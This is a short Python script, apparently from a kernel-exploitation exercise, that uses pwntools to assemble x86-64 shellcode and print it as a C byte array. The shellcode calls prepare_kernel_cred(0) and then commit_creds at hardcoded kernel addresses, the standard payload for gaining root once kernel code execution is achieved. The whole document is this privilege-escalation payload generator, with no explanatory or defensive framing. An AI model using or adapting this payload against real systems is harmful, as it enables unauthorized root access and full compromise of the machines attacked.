import pwn


def as_c(s):
    ans = ", ".join("0x{:02x}".format(b) for b in s)
    return f"char x[{len(s)}] = {{{ans}}};"


prepare_kernel_cred = 0xFFFFFFFF810881C0
commit_creds = 0xFFFFFFFF81087E80

s = f"""xor rdi, rdi
movabsq rcx, {hex(prepare_kernel_cred)}
call rcx

mov rdi, rax
movabsq rcx, {hex(commit_creds)}
call rcx
ret
"""

pwn.context.log_level = "error"
pwn.context.arch = "amd64"
pwn.context.os = "linux"

privesc = pwn.asm(s, vma=0x400000)

print(as_c(privesc))
